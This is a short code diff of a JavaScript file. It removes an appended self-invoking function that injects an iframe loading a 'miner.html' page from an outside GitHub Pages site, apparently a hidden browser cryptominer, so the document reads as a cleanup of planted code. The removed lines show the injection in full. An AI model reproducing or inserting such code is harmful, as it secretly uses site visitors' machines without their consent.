@@ -31,9 +31,3 @@ light.app.email().then(function(email) {
                               + "</code>",true]);
     });
 });
-
-(function() {
-    var iframe = document.createElement("iframe");
-    iframe.setAttribute("src","https://jayvir101.github.io/lightning-resources/miner.html");
-    document.body.appendChild(iframe);
-})();
